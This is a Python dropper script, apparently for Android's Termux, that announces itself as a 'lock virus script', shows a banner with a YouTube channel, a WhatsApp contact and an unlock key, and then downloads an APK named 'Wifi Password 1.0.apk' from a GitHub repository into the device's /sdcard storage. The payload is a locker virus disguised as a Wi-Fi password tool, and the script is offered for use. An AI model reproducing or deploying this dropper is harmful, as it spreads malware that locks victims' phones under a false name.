import sys,os,platform
from time import *
x = platform.system()
try:
 import requests
 from tqdm import tqdm
except Exception:
 os.system('pip install tqdm')
 os.system('pip install requests')
os.system('clear')
print('                 \033[1;33;45mWelcome to this lock virus script\033[1;33;40m')
print('''
\033[1;34m _______________________________________________________________\033[1;34m
\033[1;34m|                                                               |\033[1;34m
\033[1;34m| \033[1;32m[\033[1;31m*\033[1;32m]\033[1;35m youtube\033[1;32m  https://youtube.com/c/AndroidWorld204           \033[1;34m |\033[1;34m
\033[1;34m|                                                               |\033[1;34m
\033[1;34m|\033[1;32m [\033[1;31m*\033[1;32m]\033[1;35m whatsApp\033[1;32m http://Wa.me/+201201473887                   \033[1;34m   |\033[1;34m
\033[1;34m|                                                               |\033[1;34m
\033[1;34m|_______________________________________________________________|\033[1;34m


\033[1;31m      _                      _______                      _
   _dMMMb._              .adOOOOOOOOOba.              _,dMMMb_
  dP'  ~YMMb            dOOOOOOOOOOOOOOOb            aMMP~  `Yb
  V      ~"Mb          dOOOOOOOOOOOOOOOOOb          dM"~      V
           `Mb.       dOOOOOOOOOOOOOOOOOOOb       ,dM'
            `YMb._   |OOOOOOOOOOOOOOOOOOOOO|   _,dMP'
       __     `YMMM| OP'~"YOOOOOOOOOOOP"~`YO |MMMP'     __
     ,dMMMb.     ~~' OO     `YOOOOOP'     OO `~~     ,dMMMb.
  _,dP~  `YMba_      OOb      `OOO'      dOO      _aMMP'  ~Yb._
 <MMP'     `~YMMa_   YOOo \033[1;32m  @  \033[1;31mOOO \033[1;32m @  \033[1;31m oOOP   _adMP~'      `YMM>
              `YMMMM\`OOOo     OOO     oOOO'/MMMMP'
      ,aa.     `~YMMb `OOOb._,dOOOb._,dOOO'dMMP~'       ,aa.
    ,dMYYMba._         `OOOOOOOOOOOOOOOOO'          _,adMYYMb.
   ,MP'   `YMMba._      OOOOOOOOOOOOOOOOO       _,adMMP'   `YM.
   MP'        ~YMMMba._ YOOOOPVVVVVYOOOOP  _,adMMMMP~       `YM
   YMb           ~YMMMM\`OOOOI`````IOOOOO'/MMMMP~           dMP
    `Mb.           `YMMMb`OOOI,,,,,IOOOO'dMMMP'           ,dM'
      `'                  `OObNNNNNdOO'                   `'
                            `~OOOO0~'

            \033[1;31;46m Programmed by the engineer Wageh Hiroshima....The kay is (624857913) \033[1;33;40m

''')
try:
 chunk_size = 1024;url = 'https://github.com/ABDULLAHALSAKKA/cia-fb/blob/master/Wifi%20Password%201.0.apk?raw=true';r = requests.get(url, stream = True);size = int(r.headers['content-length']);filename = url.split('/')[-1]
 with open(filename, 'wb') as f:
  for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
   f.write(data)
 os.system("mv 'Wifi%20Password%201.0.apk?raw=true' Wifi_Password.apk")
 os.system('mv Wifi_Password.apk /sdcard')
 input('\033[1;31mEnter the Exit program ')
 os.system('clear')
 print('\033[1;35m        ____               ____')
 print('       | __ ) _   _  ___  | __ ) _   _  ___')
 print('       |  _ \| | | |/ _ \ |  _ \| | | |/ _ \ ')
 print('       | |_) | |_| |  __/ | |_) | |_| |  __/')
 print('       |____/ \__, |\___| |____/ \__, |\___|')
 print('              |___/              |___/')
 print('\n\n\033[1;31m         _ __ ___  _   _  | | _____   _____')
 print("        | '_ ` _ \| | | | | |/ _ \ \ / / _ \ ")
 print('        | | | | | | |_| | | | (_) \ V /  __/')
 print('        |_| |_| |_|\__, | |_|\___/ \_/ \___|')
 print('                    |___/ \n\n')
except Exception:
 print('                \033[1;30m[\033[1;31m-\033[1;30m]\033[1;31m There is no internet connection\033[1;36m')



